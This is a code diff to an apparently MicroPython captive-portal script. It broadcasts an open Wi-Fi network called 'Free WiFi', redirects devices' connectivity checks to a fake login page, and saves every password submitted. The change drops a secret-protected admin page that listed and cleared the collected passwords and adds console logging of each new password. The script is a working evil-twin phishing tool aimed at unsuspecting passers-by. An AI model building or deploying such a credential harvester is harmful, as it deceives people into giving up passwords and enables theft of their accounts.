@@ -26,12 +26,14 @@ def save_passwords(passwords):
 users = load_passwords()
 print("[+] Loaded {} passwords from storage".format(len(users)))
 
-ADMIN_SECRET = "youpasshere"
+# Configure your AP settings here
+AP_SSID = "Free WiFi"
+AP_PASSWORD = ""  # Leave empty for open network
 
 ap = network.WLAN(network.AP_IF)
 ap.active(True)
 ap.config(
-    essid="HAJI HOUSE",
+    essid=AP_SSID,
     authmode=network.AUTH_OPEN,
     txpower=20
 )
@@ -108,26 +110,6 @@ while True:
             conn.send(REDIRECT_RESPONSE)
         elif "success.txt" in req or "connectivitycheck" in req:
             conn.send(REDIRECT_RESPONSE)
-        elif "GET /admin" in req:
-            if "secret=" + ADMIN_SECRET in req:
-                body = "<html><head><meta charset='UTF-8'><title>Admin Panel</title></head><body>"
-                body += "<h2>Admin Panel</h2>"
-                body += "<p><strong>Total passwords collected:</strong> {}</p>".format(len(users))
-                body += "<h3>Password List:</h3><ol>"
-                for u in users:
-                    body += "<li>{}</li>".format(u)
-                body += "</ol>"
-                body += "<hr><small>Stored permanently in flash memory</small><br>"
-                body += "<small>Collected on: {}</small>".format(time.localtime())
-                body += "<hr><form method='POST' action='/clear?secret={}'><button type='submit' style='background:red;color:white;padding:10px;border:none;cursor:pointer'>Clear All Passwords</button></form>".format(ADMIN_SECRET)
-                body += "</body></html>"
-                conn.send(response(body).encode())
-            else:
-                conn.send(response("<h3>Access Denied</h3><p>Invalid secret key.</p>").encode())
-        elif "POST /clear" in req and "secret=" + ADMIN_SECRET in req:
-            users.clear()
-            save_passwords(users)
-            conn.send(response("<h3>Cleared</h3><p>All passwords deleted. <a href='/admin?secret={}'>Back to admin</a></p>".format(ADMIN_SECRET)).encode())
         elif "POST /submit" in req:
             try:
                 body = req.split("\r\n\r\n")[1]
@@ -153,6 +135,7 @@ while True:
             else:
                 users[password] = True
                 save_passwords(users)
+                print("[+] New password collected: {}".format(password))
                 conn.send(response("<h3>Success</h3><p>Connected successfully.</p>").encode())
         else:
             conn.send(PORTAL_HTML.encode())
